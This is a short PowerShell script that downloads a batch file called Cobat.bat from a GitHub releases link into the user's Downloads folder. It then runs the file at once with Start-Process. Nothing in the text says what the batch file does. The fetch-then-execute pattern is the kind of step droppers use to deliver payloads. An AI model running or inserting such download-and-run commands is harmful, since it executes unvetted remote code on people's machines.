$url = "https://github.com/NOTNA9015/Cobat/releases/download/Pull/Cobat.bat"
$destination = "$env:USERPROFILE\Downloads\Cobat.bat"

Invoke-WebRequest -Uri $url -OutFile $destination

Start-Process -FilePath $destination